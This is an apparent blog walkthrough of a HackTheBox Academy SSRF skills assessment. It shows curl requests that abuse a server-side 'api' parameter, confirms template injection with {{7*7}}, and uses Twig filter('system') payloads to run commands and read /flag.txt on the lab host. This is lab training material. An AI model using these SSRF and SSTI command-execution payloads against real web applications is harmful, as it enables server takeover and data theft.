---
title: SSRF Skills Assesment HTB Academy 
image: /assets/img/Anexos/SSRF-HTB.jpg
description: Solution of the SSRF Skills Assesment from HTB Academy 
categories: [CTF,HackTheBox]
tags: [hacking]
---

Once we've got the target, if we take a look the source code `CTRL+U` que can see a Javascript script which reveals a new api endpoint 

![](/assets/img/Anexos/Server%20Side%20Attacks%20Skills%20Assessments.png)

![](/assets/img/Anexos/Server%20Side%20Attacks%20Skills%20Assessments-1.png)


```shell
<script> for (var truckID of ["FusionExpress01", "FusionExpress02", "FusionExpress03"]) { var xhr = new XMLHttpRequest(); xhr.open('POST', '/', false); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.onreadystatechange = function() { if (xhr.readyState === XMLHttpRequest.DONE) { var resp = document.getElementById(truckID) if (xhr.status === 200) { var responseData = xhr.responseText; var data = JSON.parse(responseData); if (data['error']) { resp.innerText = data['error']; } else { resp.innerText = data['location']; } } else { resp.innerText = "Unable to fetch current truck location!" } } }; xhr.send('api=http://truckapi.htb/?id' + encodeURIComponent("=" + truckID)); } </script>
```

We can confirm this reloading the page and watching the network tab using dev tools in our browser, several petitions are made.

![](/assets/img/Anexos/Server%20Side%20Attacks%20Skills%20Assessments-2.png)

We can test this api endpoint using the previous petition 

```shell
curl -X POST http://154.57.164.64:30160   -d 'api=http://truckapi.htb/?id=FusionExpress02' -H "Content-Typ  
e: application/x-www-form-urlencoded"     
{"id": "FusionExpress02", "location": "456 Oak Avenue"}
```

We can attempt to exploit a SSRF which has done successfully but we cannot achieve RCE or find interesting data with LFI

```shell
curl -X POST http://154.57.164.64:30160   -d 'api=http://127.1:80' -H "Content-Type: application/x-www-for  
m-urlencoded"     
  
<!doctype html>  
<html class="no-js" lang="en">  
<head>  
       <meta charset="utf-8">  
<SNIP>...
```


Testing further we can realise that any input we introduced within the id parameter will be reflected in the server response, that means that we can try some injections

```shell
 curl -X POST http://154.57.164.64:30160   -d 'api=http://truckapi.htb/?id=testing' -H "Content-Type: appli  
cation/x-www-form-urlencoded"     
{"id": "testing", "location": "134 Main Street"}
```

In this case I started to attempt SSTI injection following this table: 

![](/assets/img/Anexos/Server%20Side%20Attacks%20Skills%20Assessments-6.png)

```shell
curl -X POST http://154.57.164.64:30160   -d 'api=http://truckapi.htb/?id={{7*7}}' -H "Content-Type: appli  
cation/x-www-form-urlencoded"     
{"id": "49", "location": "134 Main Street"}
```

After getting **49** using the payload `{{7*7}}` we can sightly confirm that the server is handled by **twig**, so now we can try to inject come system commands: 

```twig
{{ ['id'] | filter('system') }}
```

![](/assets/img/Anexos/Server%20Side%20Attacks%20Skills%20Assessments-3.png)


Then I searched in the _/_ directory looking for the _flag.txt_ file

```twig
{{ ['ls /'] | filter('system') }}
```

![](/assets/img/Anexos/Server%20Side%20Attacks%20Skills%20Assessments-4.png)

Finally we can reed the flag:

```twig
{{ ['cat /flag.txt'] | filter('system') }}
```

![](/assets/img/Anexos/Server%20Side%20Attacks%20Skills%20Assessments-5.png)